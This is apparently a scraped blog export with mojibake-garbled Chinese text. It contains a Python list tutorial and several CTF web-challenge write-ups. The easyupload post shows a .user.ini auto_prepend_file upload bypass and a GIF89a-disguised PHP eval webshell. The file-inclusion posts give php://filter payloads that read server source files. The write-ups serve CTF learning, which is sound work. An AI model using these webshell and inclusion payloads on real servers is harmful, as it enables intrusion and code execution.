70, 60, 50, 40, 30, 20, 10]print(list1[6:0:-2]) # [70, 50, 30] åˆ¤æ–­å…ƒç´ åœ¨åˆ—è¡¨ä¸­æ˜¯å¦å­˜åœ¨å…ƒç´  in/not in åˆ—è¡¨ åˆ—è¡¨å…ƒç´ çš„éå†ï¼šfor è¿­ä»£å˜é‡ in åˆ—è¡¨åï¼š æ“ä½œ eg: 123456list=[10,20,'python','hello']print(10 in list) # Trueprint(100 in list) # Falseprint(10 not in list) # Falsefor i in list: print(i) #10 20 python hello åˆ—è¡¨å¢åŠ  append() åœ¨åˆ—è¡¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå…ƒç´  extend() åœ¨åˆ—è¡¨æœ«å°¾è‡³å°‘æ·»åŠ ä¸€ä¸ªå…ƒç´  insert() åœ¨åˆ—è¡¨ä»»æ„ä½ç½®æ·»åŠ ä¸€ä¸ªä½ç½® åˆ‡ç‰‡ åœ¨ä»»æ„ä½ç½®è‡³å°‘æ·»åŠ ä¸€ä¸ªå…ƒç´  eg: 12345678910111213list=[10,20,30]list.append(100)print(list) #[10,20,30,100]list2=['hello','world']list.append(list2)print(list) # [10, 20, 30, 100, ['hello', 'world']]list.extend(list2)print(list) # [10, 20, 30, 100, ['hello', 'world'], 'hello', 'world'] list.insert(1,90)print(list) # [10, 90, 20, 30, 100, ['hello', 'world'], 'hello', 'world']list3=[True,False,'hello']list[1:]=list3print(list) # [10, True, False, 'hello'] åˆ—è¡¨åˆ é™¤ remove() ä¸€æ¬¡åˆ ä¸€ä¸ªï¼›é‡å¤å…ƒç´ åªåˆ ç¬¬ä¸€ä¸ªï¼›å…ƒç´ ä¸å­˜åœ¨è¿”å›error pop() åˆ é™¤ä¸€ä¸ªæŒ‡å®šç´¢å¼•ä½ç½®ä¸Šçš„å…ƒç´ ï¼›æŒ‡å®šç´¢å¼•ä¸å­˜åœ¨è¿”å›error;ä¸æŒ‡å®šç´¢å¼•ï¼Œåˆ é™¤åˆ—è¡¨ä¸­æœ€åä¸€ä¸ªå…ƒç´  åˆ‡ç‰‡ ä¸€æ¬¡è‡³å°‘åˆ é™¤ä¸€ä¸ªå…ƒç´  clear() æ¸…ç©ºåˆ—è¡¨ del åˆ é™¤åˆ—è¡¨ eg: 12345678910111213141516171819list=[10,20,30,40,50,60,30]list.remove(30)print(list) # [10, 20, 40, 50, 60, 30]list.pop()print(list) # [10, 20, 40, 50, 60]list.pop(1)print(list) # [10, 40, 50, 60]new_list=list[1:3]print(list) # [10, 40, 50, 60]print(new_list) # [40, 50] #ä¸äº§ç”Ÿæ–°çš„åˆ—è¡¨ï¼Œç›´æ¥åˆ é™¤åŸåˆ—è¡¨å†…å®¹list[1:3]=[]print(list) # [10, 60]list.clear()print(list) # [] #del åˆ é™¤åˆ—è¡¨del listprint(list)print(list) # &lt;class 'list'&gt; åˆ—è¡¨ä¿®æ”¹ ä¸ºæŒ‡å®šç´¢å¼•çš„å…ƒç´ èµ‹äºˆä¸€ä¸ªæ–°å€¼ ä¸ºæŒ‡å®šçš„åˆ‡ç‰‡èµ‹äºˆä¸€ä¸ªæ–°å€¼ eg: 12345list=[10,20,30,40]list[2]=100print(list) # [10, 20, 100, 40]list[1:3]=[300,400,500]print(list) # [10, 300, 400, 500, 40] åˆ—è¡¨æ’åº è°ƒç”¨sort(),åˆ—ä¸­æ‰€æœ‰å…ƒç´ é»˜è®¤æŒ‰ç…§ä»å°åˆ°å¤§é¡ºåºè¿›è¡Œæ’åºï¼Œå¯ä»¥æŒ‡å®šreverse=Trueè¿›è¡Œé™åºã€‚ è°ƒç”¨å†…ç½®å‡½æ•°sorted(),å¯ä»¥æŒ‡å®šreverse=Trueè¿›è¡Œé™åºæ’åºï¼ŒåŸåˆ—è¡¨ä¸å‘ç”Ÿå˜åŒ–ï¼ˆäº§ç”Ÿæ–°åˆ—è¡¨ï¼‰ eg: 12345678list=[20,40,10,98,45]list.sort()print(list) # [10, 20, 40, 45, 98] #é™åºlist.sort(reverse=True)print(list) # [98, 45, 40, 20, 10]list.sort(reverse=False)print(list) # [10, 20, 40, 45, 98] eg: 1234567list=[20,40,10,98,45]new_list=sorted(list)print(list) # [20, 40, 10, 98, 45]print(new_list) # [10, 20, 40, 45, 98] #é™åºdesc_list=sorted(list,reverse=True)print(desc_list) # [98, 45, 40, 20, 10] åˆ—è¡¨ç”Ÿæˆå¼[åˆ—è¡¨å…ƒç´ çš„è¡¨è¾¾å¼ for i in range(1,10)] egï¼š 1234l=[i for i in range(1,10)]print(l) # [1, 2, 3, 4, 5, 6, 7, 8, 9]l2=[ i*2 for i in range(1,6)]print(l2) # [2, 4, 6, 8, 10]","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"æ”»é˜²ä¸–ç•Œweb-easyupload","slug":"æ”»é˜²ä¸–ç•Œweb-easyupload","date":"2022-08-17T06:58:13.030Z","updated":"2022-08-17T15:07:24.305Z","comments":true,"path":"2022/08/17/æ”»é˜²ä¸–ç•Œweb-easyupload/","link":"","permalink":"https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/","excerpt":"","text":"é¢˜ç›®æè¿°:ä¸€ååˆæ ¼çš„é»‘å®¢çœ¼ä¸­ï¼Œæ‰€æœ‰çš„ä¸Šä¼ ç‚¹éƒ½æ˜¯å¼€å‘è€…ç•™ä¸‹çš„åé—¨ ä¸Šä¼ æ–‡ä»¶åè¿”å›æ–‡ä»¶è·¯å¾„äº†ã€‚ å°è¯•ä¿®æ”¹åç¼€ä¸º.phpï¼Œä¸Šä¼ å¤±è´¥ã€‚ æ–°å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š 12GIF89aabc.jpg ç„¶åæ–‡ä»¶åæ”¹æˆa.jpg ä¸Šä¼ æˆåŠŸã€‚ ï¼ˆæ³¨ï¼šæˆ‘ä»¥ä¸ºæ˜¯å¸¦ç€jpgçš„å¤´æ–‡ä»¶å°±å¯ä»¥ç”¨ä¸€å¥è¯æœ¨é©¬äº†ï¼Œç»“æœèšå‰‘è¿ç€çš„æ—¶å€™æ•°æ®ä¸ºç©ºï¼Œæ˜¯æˆ‘å¤©çœŸäº†ï¼Œæœæ–­çœ‹å®˜æ–¹wpï¼‰ è§£é¢˜æ€è·¯åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ç‚¹ï¼Œé€šè¿‡ç»•è¿‡æœåŠ¡å™¨çš„å®‰å…¨é˜²æŠ¤ï¼Œè¾¾åˆ°getshellçš„ç›®çš„ï¼Œä¸»è¦è€ƒå¯Ÿåˆ©ç”¨fastcgiçš„.user.iniç‰¹æ€§è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ æœ‰å…³åˆ©ç”¨.usr.iniæ„å»ºphpåé—¨ï¼Œåšæ–‡è´´ï¼š https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html ç»•è¿‡çš„ç‚¹ï¼š æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰phpå­—ç¬¦ä¸² å¯ä»¥åˆ©ç”¨æ®µæ ‡ç­¾ç»•è¿‡ï¼Œä¾‹å¦‚&lt;?=phpinfo();?&gt; æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰htaccessæˆ–ph å¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniä»¥åŠæ­£å¸¸jpgæ–‡ä»¶æ¥è¿›è¡Œgetshellï¼Œåœ¨æœåŠ¡å™¨ä¸­åªè¦è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.ini,å¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚ å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto+prepend_file æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯ ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼Œæ¯”å¦‚GIF89a æ–‡ä»¶MIMEç±»å‹ ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„Content-Type æ–°å»ºæ–‡ä»¶æ›´åä¸º.user.iniï¼Œå†…å®¹ä¸º 12GIF89aauto_prepend_file=a.jpg ä¸Šä¼ .user.iniï¼ŒbpæŠ“åŒ…ï¼Œæ›´æ”¹Content-Typeä¸ºimage/jpg,æ”¾åŒ…ï¼Œæ˜¾ç¤ºä¸Šä¼ æˆåŠŸã€‚ æ–°å»ºæ–‡ä»¶æ›´åä¸ºa.jpgï¼Œå†…å®¹ä¸º 12GIF89a&lt;?=system('cat /flag);?&gt; ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥ï¼Œæ‰¾åˆ°flag: ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå®˜æ–¹ç»™çš„payloadä¸Šä¼ ä¹‹å500æŠ¥é”™ï¼Œæ¢äº†ä¸€ä¸ªpayloadæˆåŠŸäº†ï¼š 12GIF89a&lt;?=eval($_REQUEST['cmd']);?&gt; cyberpeace{6ed12a66909f053b9bc1799622c9ce7e}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"æ”»é˜²ä¸–ç•Œweb-fileinclude","slug":"æ”»é˜²ä¸–ç•Œweb-fileinclude","date":"2022-08-17T03:31:33.308Z","updated":"2022-08-17T04:41:04.152Z","comments":true,"path":"2022/08/17/æ”»é˜²ä¸–ç•Œweb-fileinclude/","link":"","permalink":"https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/","excerpt":"","text":"é¢˜ç›® é¢˜ç›®å‘ŠçŸ¥flagåœ¨flag.phpé‡Œï¼Œåˆ†ææºä»£ç ï¼š 123456789101112131415161718&lt;?phpif( !ini_get('display_errors') ) { ini_set('display_errors', 'On'); # æ‰“å¼€æŠ¥é”™æç¤º }error_reporting(E_ALL); #è®¾ç½®phpçš„æŠ¥é”™çº§åˆ«ä¸ºæ‰€æœ‰çš„é”™è¯¯å’Œè­¦å‘Šï¼Œå¹¶è¿”å›å½“å‰çº§åˆ«$lan = $_COOKIE['language']; #è¯­è¨€åˆ‡æ¢if(!$lan){ @setcookie(\"language\",\"english\"); # setcookieå‘å®¢æˆ·ç«¯å‘é€è·Ÿä¸€ä¸ªHttp cookie(ç”±æœåŠ¡å™¨å‘é€åˆ°æµè§ˆå™¨çš„å˜é‡) @include(\"english.php\"); # å¯¼å…¥è¯­è¨€åŒ…}else{ @include($lan.\".php\");# åç¼€.php}$x=file_get_contents('index.php'); # index.php è¯»å–åˆ°$xä¸­echo $x; #è¾“å…¥x?&gt; è®¾ç½®cookie-languageï¼Œå°±å¯ä»¥æ‰§è¡Œinclude($lan.\".php\") ç”¨ä¼ªåè®®php://filterè¯»å–æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºï¼šphp://filter / [read|write =] è¿‡æ»¤å™¨ / resource= ç›®æ ‡æ–‡ä»¶ è¿‡æ»¤å™¨çš„åˆ†ç±»ï¼ˆåŠå¸¸è§è¿‡æ»¤å™¨ï¼‰php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ï¼Œ string filter(å­—ç¬¦è¿‡æ»¤å™¨) string.rot13 (å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 è½¬æ¢) ä¾‹ï¼šphp://filter/string.rot13/resource=flag.php string.toupper (è½¬å¤§å†™) ä¾‹ï¼šphp://filter/string.toupper/resource=flag.php string.tolower (è½¬å°å†™) string.strip_tags (å»é™¤ HTML å’Œ PHP æ ‡è®°ï¼Œå°è¯•è¿”å›ç»™å®šçš„å­—ç¬¦ä¸² str å»é™¤ç©ºå­—ç¬¦ã€HTML å’Œ PHP æ ‡è®°åçš„ç»“æœ) ä¾‹ï¼šphp://filter/string.strip_tags/resource=flag.php conversion filter (è½¬æ¢è¿‡æ»¤å™¨) convert.base64-encode &amp; convert.base64-decode (base64åŠ å¯† base64è§£å¯†) ä¾‹ï¼šphp://filter/convert.base64-encode/resource=flag.php convert.quoted-printable-encode &amp; convert.quoted-printable-decode(åœ¨å­—ç¬¦ä¸²ååŠ =0A,åŠæ¢å¤) compression filter(å‹ç¼©è¿‡æ»¤) zlib.deflate &amp; zlib.inflate(å‹ç¼© è§£å‹) ä¾‹ï¼šphp://filter/zlib.deflate/resource=flag.php ä¾‹ï¼šphp://filter/zlib.inflate/resource=flag.php bzip2.compress &amp; bzip2.decompress(zip å‹ç¼© è§£å‹) encryption filter(åŠ å¯†è¿‡æ»¤å™¨) resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; ï¼š å¿…é¡»å‚æ•°ï¼ŒæŒ‡å®šäº†è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµ read=&lt;ç‹¬é“¾çš„ç­›é€‰åˆ—è¡¨&gt; ï¼š å¯é€‰å‚æ•°ï¼Œè®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦(/)åˆ†éš” write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt; ï¼š å¯é€‰å‚æ•°ï¼Œè®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦(/)åˆ†éš” &lt;;ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt; ï¼š ä»»ä½•æ²¡æœ‰ä»¥read=æˆ–write=åšå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ payloadï¼š `cookieï¼šlanguage=php://filter/convert.base64-encode/resource=flag bpæŠ“åŒ…ï¼ŒæŠŠcookieæ”¹æˆpayload,å³å¯å¾—åˆ°å¯†æ–‡ï¼Œbase64è§£å¯†å³å¯ï¼Œæˆ–è€…ç›´æ¥åœ¨ç½‘é¡µç«¯æŠŠcookieæ”¹äº†ä¹Ÿè¡Œ flag: cyberpeace{771e511122aa7492d439ae469279c22e}","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"æ”»é˜²ä¸–ç•Œweb-very_easy_sql","slug":"æ”»é˜²ä¸–ç•Œweb-very_easy_sqlæœªå®Œæˆ","date":"2022-08-17T03:00:36.731Z","updated":"2022-08-17T04:41:04.149Z","comments":true,"path":"2022/08/17/æ”»é˜²ä¸–ç•Œweb-very_easy_sqlæœªå®Œæˆ/","link":"","permalink":"https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/","excerpt":"","text":"é¢˜ç›®æè¿°:å¤ªç®€å•äº†ä¸æè¿°äº†ï¼Œç»™sqlç­¾ä¸ªåˆ°å§ é¢˜ç›®ä¸Šè¯´ï¼šéå†…éƒ¨ç”¨æˆ·æ— æ³•è®¿é—®ã€‚ æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æœ‰ä¸ªuse.phpæ–‡ä»¶ï¼š ä¸è¡Œï¼Œçœ‹å¤§ä½¬å†™çš„wpå¥½éš¾ï¼Œçœ‹ä¸æ‡‚ï¼Œå…ˆæ”¾ä¸€æ”¾ã€‚ https://blog.csdn.net/m0_48780534/article/details/126309908","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"sql","slug":"sql","permalink":"https://sinky.top/tags/sql/"},{"name":"SSRF","slug":"SSRF","permalink":"https://sinky.top/tags/SSRF/"}]},{"title":"phpä¼ªåè®®","slug":"phpä¼ªåè®®","date":"2022-08-16T08:10:38.035Z","updated":"2022-08-16T08:46:11.888Z","comments":true,"path":"2022/08/16/phpä¼ªåè®®/","link":"","permalink":"https://sinky.top/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"os: æ•´åˆäº†ä¸€ä¸‹å„è·¯å¤§ä½¬çš„ç¬”è®°ï¼Œçœå¾—æœæ¥æœå»â€¦â€¦ åœ¨CTFä¸­å¯èƒ½é‡åˆ°çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š includeã€requireã€include_onceã€require_onceã€highlight_fileã€show_sourceã€readfileã€file_get_contentsã€fopenã€file phpæ”¯æŒçš„ä¼ªåè®®phpä¼ªåè®®äº‹å®ä¸Šå°±æ˜¯æ”¯æŒçš„åè®®ä¸å°è£…åè®®ï¼ˆ12ç§ï¼‰ file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ http:// â€” è®¿é—® HTTP(s) ç½‘å€ ftp:// â€” è®¿é—® FTP(s) URLs php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ zlib:// â€” å‹ç¼©æµ data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ phar:// â€” PHP å½’æ¡£ ssh2:// â€” Secure Shell 2 rar:// â€” RAR ogg:// â€” éŸ³é¢‘æµ expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ file://ä½œç”¨ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚ include()/require()/include_once()/require_once()å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œå¦‚å¯¼å…¥ä¸ºé.phpæ–‡ä»¶ï¼Œåˆ™ä»æŒ‰ç…§phpè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ˜¯include()å‡½æ•°æ‰€å†³å®šçš„ã€‚ è¯´æ˜file:// æ–‡ä»¶ç³»ç»Ÿæ˜¯ PHP ä½¿ç”¨çš„é»˜è®¤å°è£…åè®®ï¼Œå±•ç°äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼ˆä¸ä»¥/ã€ã€\\æˆ– Windows ç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ï¼‰æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„å·¥ä½œç›®å½•ã€‚åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯è„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼Œé™¤éè¢«ä¿®æ”¹äº†ã€‚ä½¿ç”¨ CLI çš„æ—¶å€™ï¼Œç›®å½•é»˜è®¤æ˜¯è„šæœ¬è¢«è°ƒç”¨æ—¶æ‰€åœ¨çš„ç›®å½•ã€‚åœ¨æŸäº›å‡½æ•°é‡Œï¼Œä¾‹å¦‚ fopen() å’Œ file_get_contents()ï¼Œinclude_path ä¼šå¯é€‰åœ°æœç´¢ï¼Œä¹Ÿä½œä¸ºç›¸å¯¹çš„è·¯å¾„ã€‚ php://ä½œç”¨php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputï¼Œphp://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚ è¯´æ˜PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œå†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚ php://input â€”â€”å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„dataéƒ¨åˆ†ï¼Œåœ¨enctype=â€multipart/form-dataâ€ çš„æ—¶å€™php://input æ˜¯æ— æ•ˆçš„ã€‚ php://output â€”â€”åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚ php://fd â€”â€”(&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ php://fd/3 å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚ php://memory ä¸ php://temp â€”â€”(&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php://memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ php://temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´ã€‚ php://filter â€”â€”(&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ å¤ªå¤šäº†æ‡’å¾—æ•²äº† è´´ https://segmentfault.com/a/1190000018991087","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://sinky.top/tags/php/"}]},{"title":"CTF-fileclude","slug":"æ”»é˜²ä¸–ç•Œweb-fileclude","date":"2022-08-16T07:41:34.049Z","updated":"2022-08-16T08:46:11.884Z","comments":true,"path":"2022/08/16/æ”»é˜²ä¸–ç•Œweb-fileclude/","link":"","permalink":"https://sinky.top/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/","excerpt":"","text":"é¢˜ç›®fileclude æè¿°ï¼šå¥½å¤šfileå‘€ï¼ è¿˜æ²¡å­¦phpï¼Œç®€å•åˆ†æä¸€ä¸‹ä»£ç ï¼š 1234567891011121314151617WRONG WAY! &lt;?phpinclude(\"flag.php\"); # å¼•å…¥flag.phpæ–‡ä»¶highlight_file(__FILE__); # å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºif(isset($_GET[\"file1\"]) &amp;&amp; isset($_GET[\"file2\"])) # isset()å‡½æ•°ï¼šæ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼›$_GET[]é€šè¿‡getæ–¹æ³•ä¼ è¿‡æ¥çš„å€¼{ $file1 = $_GET[\"file1\"]; $file2 = $_GET[\"file2\"]; if(!empty($file1) &amp;&amp; !empty($file2)) # empty()ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºï¼Œæ­¤å¤„å³file1ä¸file2ä¸ä¸ºç©º { if(file_get_contents($file2) === \"hello ctf\") # file_get_contents()æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ­¤å¤„å³å°†hello ctfè¯»å–åˆ°fikle2ä¸­ { include($file1); # åŒ…å«$file1 } } else die(\"NONONO\");} ï¼ˆçœ‹æ¥æƒ³å­¦æ¸—é€çš„è¯ï¼Œphpå­¦ä¹ è¦æä¸Šæ—¥ç¨‹äº†[æ±—é¢œ]ï¼‰ $file2å†…å®¹ä¸ºhello ctfå°±å¯ä»¥åŒ…å«$file1ï¼Œä»é¢˜ç›®ä¸­å¯çœ‹å‡ºflagåœ¨flag.phpä¸­ï¼Œæ­¤é¢˜è€ƒå¯Ÿfile_get_contentså’Œphpä¼ªåè®®çš„åº”ç”¨ ï¼ˆæœ‰å…³phpä¼ªåè®®å•ç‹¬å†™äº†ä¸€ç¯‡æ–‡ï¼Œæ ‡ç­¾ä¸ºphpï¼‰ f12æ‰“å¼€ Max HackBaræ’ä»¶ ä½¿ç”¨ä¼ªåè®®æ¥æ„é€ ï¼Œå¾—åˆ°payloadä¸ºphp://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://inputï¼Œpost dataä¸ºhello ctf ï¼ˆä¸ä¼šï¼Œæœçš„å¤§ä½¬wpï¼‰ base64è§£ç å°±å¾—åˆ°flag: cyberpeace{a0dfa411a1fd4d2c2153ad62391732cf} å…³äºpayloadå¦‚ä½•æ„é€ çš„ï¼Œæˆ‘åˆå»æŸ¥äº†ä¸€ä¸‹phpä¼ªåè®®ï¼Œæœåˆ°äº†ä¸€ä¸ªä¾‹å­ï¼š ä¾‹å¦‚åœ¨ allow_url_include = on æ—¶æœåŠ¡å™¨ä¸Šæœ‰ä¸ªæ–‡ä»¶å« index.phpï¼Œä¸”å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½ç”¨ php ä¼ªåè®®ç›´æ¥æŠŠæ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥ã€‚ ?file=php://filter/read=convert.base64-encode/resource=index.php è§£é‡Šï¼šphp://filter/ æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ/read=convert.base64-encode/ è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯ base64 ç¼–ç åï¼Œresource=index.php è¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚å¦‚æœä¸è¿›è¡Œ base64 ç¼–ç ä¼ å…¥ï¼Œindex.php å°±ä¼šç›´æ¥æ‰§è¡Œï¼Œå°±çœ‹ä¸åˆ°æ–‡ä»¶ä¸­çš„å†…å®¹äº†ã€‚ï¼ˆåšæ–‡å·²è´´ï¼‰ 